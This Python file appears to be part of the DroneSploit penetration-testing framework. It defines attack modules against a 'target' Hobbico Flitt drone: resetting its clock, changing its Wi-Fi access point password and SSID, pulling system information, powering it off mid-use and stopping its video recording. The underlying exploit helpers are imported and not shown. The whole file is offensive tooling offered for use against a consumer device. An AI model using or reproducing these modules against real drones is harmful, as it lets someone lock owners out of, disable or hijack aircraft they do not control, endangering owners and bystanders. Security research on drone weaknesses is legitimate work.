# -*- coding: UTF-8 -*-
from dronesploit.drones.hobbico import FlittCommandModule
from sploitkit import *


class ChangeDatetime(FlittCommandModule):
    """ Change the datetime of the target Flitt. """
    config = Config({
        Option(
            'NEW_DATETIME',
            "new datetime to be configured",
            True,
            #FIXME: validate=lambda s: [...],
        ): "01/01/1970 00:00:00",
        Option(
            'DATETIME_FORMAT',
            "datetime format to be considered",
            True,
        ): "%d/%m/%Y %H:%M:%S",
    })
    
    def run(self):
        self._change_datetime(self.config.get("NEW_DATETIME"), self.config.get("DATETIME_FORMAT"))


class ChangeApPassword(FlittCommandModule):
    """ Change the password of the target Flitt's AP. """
    config = Config({
        Option(
            'NEW_PASSWORD',
            "Target's new password",
            True,
        ): None,
    })
    
    def run(self):
        self._change_ap_creds(self.config.option("TARGET").value, self.config.option("NEW_PASSWORD").value, False)


class ChangeApSsid(FlittCommandModule):
    """ Change the SSID of the target Flitt's AP. """
    config = Config({
        Option(
            'NEW_SSID',
            "Target's new SSID",
            True,
        ): None,
    })
    
    def run(self):
        essid = self.config.option("TARGET").value
        self._change_ap_creds(self.config.option("NEW_SSID").value, self.console.state['TARGETS'][essid]['password'])


class GetSysInfo(FlittCommandModule):
    """ Get system information from the target Flitt. """
    def run(self):
        r = self._get_sysinfo()
        if r is not None:
            print_formatted_text(r)


class PowerOff(FlittCommandModule):
    """ Power off the target Flitt. """
    def run(self):
        self._power_off()


class StopVideo(FlittCommandModule):
    """ Stop video recording of the target Flitt. """
    def run(self):
        self._stop_video()

